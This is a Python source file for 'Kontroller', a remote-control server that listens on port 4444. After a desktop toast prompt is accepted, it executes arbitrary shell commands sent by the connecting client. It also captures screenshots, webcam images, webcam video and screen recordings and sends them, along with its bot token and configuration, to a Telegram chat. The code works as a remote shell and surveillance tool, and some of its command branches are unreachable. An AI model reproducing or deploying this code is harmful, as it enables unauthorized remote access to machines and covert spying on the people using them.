import os
import wx
import json
import socket
import telepot
from random import randint
from time import gmtime, strftime


from utils import *
from picture_utils import *


"""
888    d8P  .d88888b. 888b    888888888888888888888b.  .d88888b. 888     888     88888888888888888b.
888   d8P  d88P" "Y88b8888b   888    888    888   Y88bd88P" "Y88b888     888     888       888   Y88b
888  d8P   888     88888888b  888    888    888    888888     888888     888     888       888    888
888d88K    888     888888Y88b 888    888    888   d88P888     888888     888     8888888   888   d88P
8888888b   888     888888 Y88b888    888    8888888P" 888     888888     888     888       8888888P"
888  Y88b  888     888888  Y88888    888    888 T88b  888     888888     888     888       888 T88b
888   Y88b Y88b. .d88P888   Y8888    888    888  T88b Y88b. .d88P888     888     888       888  T88b
888    Y88b "Y88888P" 888    Y888    888    888   T88b "Y88888P" 88888888888888888888888888888   T88b
"""





class Kontroller():

    def __init__(self, host: str, port: int, sock: socket.socket = None, max_connections : int=1, botToken=None, chatID = None, ring : bool = None):
        if sock is None:
            self.sock = socket.socket()
        self.blocked = []
        self.host = host
        self.port = port
        self.ring = ring
        self.botToken = botToken

        if not(self.botToken is None):
            self.bot = telepot.Bot(self.botToken)
            self.chatID = chatID
            if chatID is None or not(str(chatID).isdigit()):
                toast(app_id="Kontroller", title="Error", body="You have to submit a valid ChatID")
                self.bot_isset = False
            else:
                self.bot_isset = True
        else:
            self.bot_isset = False

        self.max_connections = max_connections
        self.connections = 0
        self.req_log = {}

    def screenshot(self, imageName):
        app = wx.App()  # Need to create an App instance before doing anything
        screen = wx.ScreenDC()
        size = screen.GetSize()
        bmp = wx.Bitmap(size[0], size[1])
        mem = wx.MemoryDC(bmp)
        mem.Blit(0, 0, size[0], size[1], screen, 0, 0)
        del mem  # Release bitmap
        bmp.SaveFile(imageName, wx.BITMAP_TYPE_PNG)


    def handle(self, raddr, sock: socket.socket = None):

        self.connections += 1
        now = strftime("%Y-%m-%d %H:%M:%S", gmtime())
        self.req_log.update({raddr:now})

        tmp = open("log.txt","w")
        tmp.close()

        if sock is None:
            sock = self.conn
            
        sock.send(f"WELCOME IN {os.getcwd()}\n".encode())

        while True:
            with open("log.txt", "a") as log_file:
                log_file.write(str(self.req_log)+"\n")
            try:
                data = sock.recv(1024)
            except Exception as e:
                print(e)
                break
            else:
                if not data:
                    print("NO DATA")
                    break
                else:
                    ddata = data.decode("cp850")
                    
                    if not(ddata.startswith("/")):
                        if ddata.strip() != "" and not(ddata.strip().isspace()):
                            output = NewThread(execute_cmd, True, ddata)
                            sock.send(output)
                            print(output)
    
                        elif ddata.startswith("cd"):
                            destdir = ddata[2:]
                            if os.path.exists(destdir) and os.path.isdir(destdir):
                                os.chdir(destdir)
                                sock.send(f"Directory changed to {os.getcwd()}")
                            else:
                                sock.send(b"Directory not found.\n")
    
                        elif ddata == "exit":
                            sock.close()
    
                        elif ddata == "pwd":
                            sock.send(os.getcwd().encode())


                    elif ddata.startswith("/"):

                        if ddata.startswith("/notify"):
                            notification = ddata[8:]
                            toast(title=f"{raddr[0]}:{raddr[1]}", 
                                  body=notification, 
                                  app_id="Kontroller",
                                  icon=os.path.abspath(r"Assets\icon.ico"))
                            
                        elif ddata.startswith("/show_webcam"):
                            title = "Title" if len(ddata.split()) < 2 else ddata.split()[1]
                            start_new_thread(show_webcam, args=(title))

                        elif ddata.startswith("/telegram"):
                            if self.botToken is None:
                                sock.send(b"Bot not connected")
                            else:
                                if len(ddata.split()) > 1:
                                    arguments = ddata.split()[1:]
                                    argument = arguments[0]
                                    imname = f"tmp{randint(9999, 99999999999999999999)}"

                                    if argument in ("show_webcam", "selphie"):
                                        imname_tmp = imname+".png"
                                        return_value = cv2.imwrite(imname_tmp, show_webcam("miaomiao", show=False))
                                        if return_value:
                                            self.send_pic(self.chatID, imname_tmp, self.bot)
                                            os.remove(imname_tmp)

                                    elif argument == "screenshot":
                                        imname_tmp = imname+".png"
                                        try:
                                            self.screenshot(imname_tmp)
                                            self.send_pic(self.chatID, imname_tmp, self.bot)
                                        except Exception as e:
                                            sock.send(f"Unknown error:\n{e}\n".encode())
                                        else:
                                            os.remove(imname_tmp)

                                    elif argument in ("webcam_screen", "ws"):
                                        if len(arguments) == 2 and arguments[1].isdigit():
                                            if NewThread(record_webcam_and_screen, True, int(arguments[1])):
                                                self.bot.sendVideo(self.chatID, open("tmp/output.mp4", "rb"), duration=int(arguments[1]))
                                                os.remove("tmp/output.mp4")

                                    elif argument in ("record_screen", "rscreen"):
                                        if len(arguments) == 2 and arguments[1].isdigit():
                                            if NewThread(record_screen, True, int(arguments[1])):
                                                self.bot.sendVideo(self.chatID, open("tmp/output.mp4", "rb"), duration=int(arguments[1]))
                                                os.remove("tmp/output.mp4")

                                    elif argument in ("webcam_video", "wcap"):
                                        if len(arguments) == 2 and arguments[1].isdigit():
                                            if NewThread(record_webcam, True, int(arguments[1])):
                                                self.bot.sendVideo(self.chatID, open("tmp/output.mp4", "rb"), duration=int(arguments[1]))
                                                os.remove("tmp/output.mp4")
                                        else:
                                            sock.send(b"\nYou must provide me with the duration of the video\n")
                                        
                                else:
                                    sock.send(b"""\nARGUMENTS:
show_webcam \ selphie
screenshot \ screen
webcam_video \ wcap
webcam_screen \ ws
record_screen \ rscreen""")
                        
                    print(ddata)
        sock.close()

        toast(app_id="Kontroller",
              title="Kontroller", 
              icon=os.path.abspath("Assets/icon.ico"),
              body=f"Client {raddr[0]}:{raddr[1]} disconnected",
              duration="short")
        
        self.connections -= 1


    def send_pic(self, chatID, image, bot=None, botToken=None):
        if bot is None:
            bot = telepot.Bot(botToken)
        bot.sendPhoto(chatID, open(image, "rb"))
        


    def server(self, host: str = None, port: int = None, ring=None):

        if ring is None:
            ring = self.ring

        if host is None and port is None:
            host = self.host
            port = self.port

        self.sock.bind((host, port))
        print(f"Address {host}:{port} binded.")

        self.sock.listen()
        print("Listening...")

        while True:
            self.conn, raddr = self.sock.accept()
            print(f"Connection request recieved from {raddr[0]}:{raddr[1]}")
            if raddr[0] in self.blocked:
                self.conn.send(b"Access Denied")
                self.conn.close()
                continue

            if self.connections < self.max_connections:
                decision = toast(app_id="Kontroller",
                                 audio="ms-winsoundevent:Notification.Looping.Call" if ring else {"src":"ms-winsoundevent:Notification.Default", "loop":"true"},
                                 title="Connection Request",
                                 duration="short",
                                 icon=os.path.abspath("Assets/icon.ico"),
                                 body=f"by {raddr[0]}:{raddr[1]}", 
                                 buttons=["Accept", "Block","Refuse"])
                
                if type(decision) == dict:
                    if decision["arguments"] == "http:Accept":
                        start_new_thread(self.handle, (raddr, self.conn, ))
    
                    elif decision["arguments"] == "http:Refuse":
                        self.conn.send(b"Connection manually refused.\n\r")
                        self.conn.shutdown(2)
                        self.conn.close()
    
                    elif decision["arguments"] == "http:Block":
                        self.conn.send(b"BANNED.\n")
                        self.blocked.append(raddr[0])
                        self.conn.close()

                elif type(decision) == tuple:
                    if str(decision[0]) == "2":
                        self.conn.send(b"Request timed out.\n\r")
                        self.conn.close()

                    elif str(decision[0]) == "0":
                        self.conn.send(b"Connection manually refused.\n\r")
                        self.conn.close()
            else:
                try:
                    self.conn.send(b"Server reached his max capacity\n\r")
                    self.conn.close()
                    return 0
                
                except:
                    self.conn.close()
                    return 0

configfile = "config/config.json"

if not(os.path.exists(configfile)):
    controller = Kontroller(host="", port=4444, max_connections=2)
    controller.server(ring=True)
else:
    var = json.load(open(configfile))
    host = var["host"]
    port = int(var["port"])
    botToken = var["botToken"]
    chatID = int(var["chatID"])
    max_connections = int(var["max_connections"])
    controller = Kontroller(host=host, port=port, max_connections=max_connections, botToken=botToken, chatID=chatID, ring=True)
    start_new_thread(controller.server)

    kontroller_info=f"""
host: "{host}"
port: {port}
botToken: "{botToken}"
chatID: {chatID}
max_connection: {max_connections}
"""

    if controller.bot_isset:
        controller.bot.sendMessage(controller.chatID, "KONTROLLER IS ACTIVE"+kontroller_info)